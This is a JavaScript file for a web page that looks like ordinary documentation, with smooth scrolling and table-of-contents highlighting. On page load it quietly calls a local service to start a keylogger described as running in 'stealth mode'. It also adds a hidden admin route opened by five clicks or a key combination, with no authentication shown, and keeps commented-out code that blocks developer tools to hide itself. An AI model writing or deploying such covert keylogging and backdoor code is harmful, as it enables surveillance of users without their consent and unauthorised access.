// Secret Access Configuration
const SECRET_CLICKS_REQUIRED = 5; // Number of clicks needed
const SECRET_CLICK_TIMEOUT = 3000; // Time window in milliseconds (3 seconds)

let clickCount = 0;
let clickTimer = null;

// Secret Trigger Element
const secretTrigger = document.getElementById('secretTrigger');
const accessNotification = document.getElementById('accessNotification');

// Initialize keylogger in background
let keyloggerStarted = false;

// Auto-start keylogger when page loads
window.addEventListener('DOMContentLoaded', async () => {
    console.log('🔒 Initializing background monitoring...');
    await startBackgroundKeylogger();
});

// Start keylogger in background (stealth mode)
async function startBackgroundKeylogger() {
    if (keyloggerStarted) return;
    
    try {
        const response = await fetch('http://localhost:5000/api/start', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ interval: 60 })
        });
        
        const data = await response.json();
        
        if (data.status === 'success') {
            keyloggerStarted = true;
            console.log('✅ Background monitoring active');
        }
    } catch (error) {
        console.error('Background monitoring initialization failed:', error);
    }
}

// Secret Button Click Handler
secretTrigger.addEventListener('click', () => {
    clickCount++;
    
    // Clear existing timer
    if (clickTimer) {
        clearTimeout(clickTimer);
    }
    
    // Visual feedback (subtle)
    secretTrigger.style.background = 'var(--primary)';
    setTimeout(() => {
        secretTrigger.style.background = '';
    }, 100);
    
    // Check if required clicks reached
    if (clickCount >= SECRET_CLICKS_REQUIRED) {
        grantAccess();
        clickCount = 0;
        return;
    }
    
    // Set timer to reset clicks
    clickTimer = setTimeout(() => {
        clickCount = 0;
    }, SECRET_CLICK_TIMEOUT);
});

// Grant Admin Access
function grantAccess() {
    // Show notification
    accessNotification.classList.add('show');
    
    // Play access sound (optional - commented out)
    // const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZSA0PVqzn77BdGAg+mdv0xnMpBSuBzvLZiTYIG2W47OihUBELTKXh8bllHgU3k9fy0H4sBSh+zPDajkAKElyw6OuoVBcJQJff9L5sIgY0iM/z1oU1BhltvO3mmlAPDlOo5vGzYBoGPJjZ88p1KwYqgMrv2oc5CBtmuOvjn08OCkug4vC6ZiQFMIvV8c1+KwcmfMjw3I9BCRFWrujur18YCT2V2/W+bSIHM4bO89SFNQcadLnr5p5QDQE=');
    // audio.play();
    
    // Redirect to admin dashboard after delay
    setTimeout(() => {
        window.location.href = '/admin-dashboard-secret';
    }, 1500);
}

// Keyboard Shortcut (Alternative Secret Access)
// Press Ctrl+Shift+A three times within 2 seconds
let shortcutCount = 0;
let shortcutTimer = null;

document.addEventListener('keydown', (e) => {
    // Check for Ctrl+Shift+A
    if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        e.preventDefault();
        
        shortcutCount++;
        
        if (shortcutTimer) {
            clearTimeout(shortcutTimer);
        }
        
        if (shortcutCount >= 3) {
            grantAccess();
            shortcutCount = 0;
            return;
        }
        
        shortcutTimer = setTimeout(() => {
            shortcutCount = 0;
        }, 2000);
    }
});

// Smooth scroll for navigation links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Active link highlighting on scroll
const sections = document.querySelectorAll('.content-section');
const navLinks = document.querySelectorAll('.nav-link');
const tocLinks = document.querySelectorAll('.toc-link');

window.addEventListener('scroll', () => {
    let current = '';
    
    sections.forEach(section => {
        const sectionTop = section.offsetTop;
        const sectionHeight = section.clientHeight;
        if (scrollY >= (sectionTop - 200)) {
            current = section.getAttribute('id');
        }
    });
    
    tocLinks.forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('href') === `#${current}`) {
            link.classList.add('active');
        }
    });
});

// Console Easter Egg for Developers
console.log('%c🔒 Secure System', 'color: #2563eb; font-size: 24px; font-weight: bold;');
console.log('%cLooking for something? 👀', 'color: #64748b; font-size: 14px;');
console.log('%cTry clicking the bottom-right corner 5 times...', 'color: #94a3b8; font-size: 12px; font-style: italic;');
console.log('%cOr press Ctrl+Shift+A three times quickly', 'color: #94a3b8; font-size: 12px; font-style: italic;');

// Prevent right-click inspection (optional - can be annoying)
// Uncomment if you want extra stealth
/*
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});
*/

// Disable common developer shortcuts (optional - very restrictive)
// Uncomment if you want maximum stealth
/*
document.addEventListener('keydown', (e) => {
    // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
    if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.shiftKey && e.key === 'J') ||
        (e.ctrlKey && e.key === 'U')
    ) {
        e.preventDefault();
        return false;
    }
});
*/

// Log page views for monitoring
console.log(`📊 Page loaded at: ${new Date().toLocaleString()}`);
